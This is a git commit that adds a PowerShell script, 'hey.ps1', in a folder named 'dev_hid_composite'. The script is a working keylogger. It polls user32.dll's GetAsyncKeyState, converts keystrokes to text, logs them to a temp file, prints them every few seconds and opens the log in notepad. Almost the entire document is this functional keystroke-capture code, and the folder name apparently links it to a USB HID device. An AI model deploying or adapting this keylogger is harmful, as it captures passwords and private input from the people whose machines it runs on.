bfbcc06279e87cabf19fa683f14f2ed8ee3d0454
map32 <shin3@cooper.edu>
2023-12-02 22:20:34 -0500

    added dev hid composite

---
+++ dev_hid_composite/hey.ps1
@@ -0,0 +1,61 @@
+function Test-KeyLogger($logPath="$env:temp\test_keylogger.txt")
+ {
+$timer = [Diagnostics.Stopwatch]::StartNew()
+   # API declaration
+   $APIsignatures = @"
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern short GetAsyncKeyState(int virtualKeyCode);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+"@
+  $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
+
+   # output file
+   $no_output = New-Item -Path $logPath -ItemType File -Force
+
+   try
+   {
+     Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red
+	$assoc = ""
+     while ($true) {
+       Start-Sleep -Milliseconds 40
+       for ($ascii = 9; $ascii -le 254; $ascii++) {
+         # get key state
+         $keystate = $API::GetAsyncKeyState($ascii)
+         # if key pressed
+         if ($keystate -eq -32767) {
+           $null = [console]::CapsLock
+           # translate code
+           $virtualKey = $API::MapVirtualKey($ascii, 3)
+           # get keyboard state and create stringbuilder
+           $kbstate = New-Object Byte[] 256
+           $checkkbstate = $API::GetKeyboardState($kbstate)
+           $loggedchar = New-Object -TypeName System.Text.StringBuilder
+
+           # translate virtual key
+           if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0))
+           {
+             #if success, add key to logger file
+             [System.IO.File]::AppendAllText($logPath, $loggedchar, [System.Text.Encoding]::Unicode)
+	$assoc += $loggedchar
+           }
+         }
+       }
+	if ($timer.elapsed.totalseconds -gt 5) {
+	Write-Host $assoc
+	$assoc = ""
+	$timer.stop()
+	$timer = [Diagnostics.Stopwatch]::StartNew()
+	}
+     }
+   }
+   finally
+   {
+     notepad $logPath
+   }
+ }
+Test-Keylogger
